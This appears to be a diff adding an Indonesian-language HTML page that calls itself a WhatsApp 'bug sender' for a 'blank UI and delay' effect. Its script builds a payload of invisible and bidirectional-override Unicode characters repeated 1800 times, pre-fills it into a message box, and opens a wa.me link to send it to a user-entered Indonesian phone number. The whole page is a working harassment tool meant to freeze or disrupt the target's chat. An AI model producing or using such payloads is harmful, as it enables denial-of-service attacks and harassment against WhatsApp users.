@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Bug WhatsApp Web - UI Blank</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #25D366;
+    }
+    input, textarea {
+      width: 90%;
+      max-width: 400px;
+      margin: 10px auto;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #25D366;
+      color: white;
+      padding: 12px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #128C7E;
+    }
+  </style>
+</head>
+<body>
+  <h1>🧨 Kirim Bug WhatsApp: UI Blank & Delay</h1>
+  <input type="text" id="nomor" placeholder="Masukkan nomor WA (cth: 628xxxxxx)" /><br>
+  <textarea id="pesan" rows="5" placeholder="Pesan Bug akan otomatis terisi..."></textarea><br>
+  <button onclick="kirim()">🚀 Kirim Sekarang</button>
+
+  <script>
+    // Karakter Unicode kombinasi delay + blank + invisible
+    const payload = "\u2063\u200f\u202e\u200b\u200f\u202d\u200c\u2062".repeat(1800);
+
+    // Isi otomatis field pesan
+    document.getElementById("pesan").value = payload;
+
+    function kirim() {
+      const nomor = document.getElementById("nomor").value.trim();
+      const pesan = document.getElementById("pesan").value;
+
+      if (!nomor.startsWith("62")) {
+        alert("❌ Nomor harus dimulai dengan 62 (kode negara Indonesia)");
+        return;
+      }
+
+      const encodedPesan = encodeURIComponent(pesan);
+      const linkWA = `https://wa.me/${nomor}?text=${encodedPesan}`;
+
+      // Otomatis membuka WhatsApp Web atau aplikasi WA
+      window.location.href = linkWA;
+    }
+  </script>
+</body>
+</html>
